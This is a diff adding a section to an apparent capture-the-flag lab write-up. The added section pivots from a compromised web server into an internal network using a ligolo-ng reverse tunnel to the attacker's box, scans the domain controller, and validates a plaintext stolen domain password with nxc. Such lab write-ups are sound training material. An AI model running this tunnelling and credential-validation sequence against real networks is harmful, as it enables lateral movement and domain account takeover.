@@ -184,5 +184,80 @@ and there’s an internal service at internal.tryhackme.loc (likely on the DC, 1
 status_connecting = "Connecting to internal API…" → confirms this app authenticates j.harris against an internal service, 
 which means j.harris is almost certainly an Active Directory domain account
 
+Pivoting into the internal network (192.168.11.0/24)
 
+The web server (192.168.11.200) is dual-homed — it sits on both the VPN-facing side and the internal corporate LAN.
+I can reach the web box, but not the DC (192.168.11.100) or WRK (192.168.11.51) behind it. 
+The fix is to tunnel through my svc-drop foothold using ligolo-ng. 
+The agent was already present in svc-drop’s home dir; I just needed the proxy on my attack box.
+
+Download the matching proxy on the attack box:
+bash
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
+tar -xf ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
+chmod +x proxy        # NOTE: binary is named 'proxy', not 'ligolo-proxy'
+
+Create the tun interface and start the proxy (attack box):
+bash
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert     # listens on 0.0.0.0:11601
+
+Confirm my tun0 (VPN) IP — this is the callback address the agent connects to:
+bash
+ip addr show tun0     # 192.168.21.3
+
+Run the agent on the target (svc-drop SSH session), pointing at the proxy:
+bash
+setsid ./ligolo-ng_agent_0.9.2_linux_amd64 -connect 192.168.21.3:11601 -ignore-cert -retry &
+
+(-retry keeps it reconnecting; setsid … & detaches it so an SSH hiccup doesn’t kill it.)
+
+In the proxy console (the ligolo-ng » prompt), select the session and start the tunnel:
+session     # pick: svc-drop@tryhackme-2404
+start
+
+Mistake I made here (and the fix): I first added a route for the whole subnet:
+
+bash
+sudo ip route add 192.168.11.0/24 dev ligolo     # <-- WRONG, caused problems
+
+This hijacked the web server’s own IP (192.168.11.200) into the tunnel — I lost the ability to reach the foothold, 
+and the agent’s keepalive died (yamux: keepalive failed: i/o deadline reached).
+
+The fix: delete the broad route and add per-host /32 routes for only the internal targets, 
+leaving the web server reachable normally:
+bash
+sudo ip route del 192.168.11.0/24 dev ligolo      # recover access to .200
+sudo ip route add 192.168.11.100/32 dev ligolo    # DC
+sudo ip route add 192.168.11.51/32 dev ligolo     # WRK
+
+Also note: the ligolo console only understands ligolo commands. Scanning tools (nmap, nxc) run in a separate normal terminal,
+not in the proxy prompt.
+
+Scanning the internal hosts (through the tunnel)
+
+Windows blocks ICMP, so a ping sweep (-sn) shows nothing. Use a TCP connect scan with -Pn:
+bash
+nmap -sT -Pn -p 88,389,445,3389 192.168.11.100 192.168.11.51
+
+Results:
+
+192.168.11.100 (DEADDROP-DC):  88 kerberos, 389 ldap, 445 smb, 3389 rdp  → OPEN  (Domain Controller)
+192.168.11.51  (DEADDROP-WRK): all filtered (host firewall)
+
+The DC is my target and fully reachable; WRK is firewalled off.
+
+Validating the domain credentials
+
+Using the APK creds (j.harris) against the DC over SMB:
+bash
+nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -d tryhackme.loc
+
+Result:
+
+SMB  192.168.11.100  445  DEADDROP-DC  [*] Windows Server 2019 Build 17763 (name:DEADDROP-DC) (domain:deaddrop.loc) (signing:True) (SMBv1:False)
+SMB  192.168.11.100  445  DEADDROP-DC  [+] tryhackme.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
+
+The credentials are valid — j.harris is a real domain account (confirming objective 2’s creds work against AD).
 
